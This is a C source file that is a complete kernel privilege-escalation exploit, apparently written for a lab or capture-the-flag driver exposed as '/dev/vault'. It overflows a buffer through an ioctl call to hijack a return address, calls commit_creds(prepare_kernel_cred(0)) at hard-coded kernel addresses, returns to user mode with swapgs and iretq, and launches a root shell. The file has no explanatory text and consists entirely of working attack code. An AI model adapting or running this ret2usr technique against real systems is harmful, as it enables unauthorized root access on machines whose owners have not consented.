#define SYS_READ 0
#define SYS_WRITE 1
#define SYS_OPEN 2
#define SYS_IOCTL 16
#define SYS_EXECVE 59
#define SYS_EXIT 60

#define DEV_PATH "/dev/vault"
#define IOCTL_TRIGGER 0x1337

#define COMMIT_CREDS 0xffffffff810f84e0UL
#define PREPARE_KERNEL_CRED 0xffffffff810f87b0UL

typedef unsigned long u64;
typedef long s64;

static u64 user_cs;
static u64 user_ss;
static u64 user_rflags;
static u64 user_sp;

static inline s64 syscall0(s64 n)
{
    s64 ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n)
                     : "rcx", "r11", "memory");
    return ret;
}

static inline s64 syscall1(s64 n, s64 a)
{
    s64 ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a)
                     : "rcx", "r11", "memory");
    return ret;
}

static inline s64 syscall2(s64 n, s64 a, s64 b)
{
    s64 ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a), "S"(b)
                     : "rcx", "r11", "memory");
    return ret;
}

static inline s64 syscall3(s64 n, s64 a, s64 b, s64 c)
{
    s64 ret;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a), "S"(b), "d"(c)
                     : "rcx", "r11", "memory");
    return ret;
}

static void write_str(const char *s)
{
    u64 len = 0;
    while (s[len] != 0)
        len++;
    syscall3(SYS_WRITE, 1, (s64)s, (s64)len);
}

static void save_state(void)
{
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushfq\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

__attribute__((noreturn)) static void win(void)
{
    static char sh[] = "/bin/sh";
    static char *argv[] = {sh, 0};
    static char *envp[] = {0};

    write_str("[+] root shell\n");
    syscall3(SYS_EXECVE, (s64)sh, (s64)argv, (s64)envp);
    syscall1(SYS_EXIT, 0);
    __builtin_unreachable();
}

__attribute__((noreturn)) static void get_root(void)
{
    typedef u64 (*prepare_kernel_cred_t)(u64);
    typedef int (*commit_creds_t)(u64);

    ((commit_creds_t)COMMIT_CREDS)(((prepare_kernel_cred_t)PREPARE_KERNEL_CRED)(0));

    __asm__ volatile(
        "swapgs\n"
        "pushq %[ss]\n"
        "pushq %[sp]\n"
        "pushq %[rflags]\n"
        "pushq %[cs]\n"
        "pushq %[rip]\n"
        "iretq\n"
        :
        : [ss] "r"(user_ss),
          [sp] "r"(user_sp),
          [rflags] "r"(user_rflags),
          [cs] "r"(user_cs),
          [rip] "r"(win)
        : "memory");

    __builtin_unreachable();
}

void _start(void)
{
    char payload[0x100];
    s64 fd;
    u64 i;

    save_state();

    fd = syscall2(SYS_OPEN, (s64)DEV_PATH, 0);
    if (fd < 0) {
        write_str("[-] open /dev/vault failed\n");
        syscall1(SYS_EXIT, 1);
    }

    for (i = 0; i < sizeof(payload); i++)
        payload[i] = 'A';

    *(u64 *)(payload + 0x40) = 0;
    *(u64 *)(payload + 0x48) = (u64)get_root;

    write_str("[*] triggering overflow\n");
    syscall3(SYS_IOCTL, fd, IOCTL_TRIGGER, (s64)payload);

    write_str("[-] exploit returned\n");
    syscall1(SYS_EXIT, 1);
}
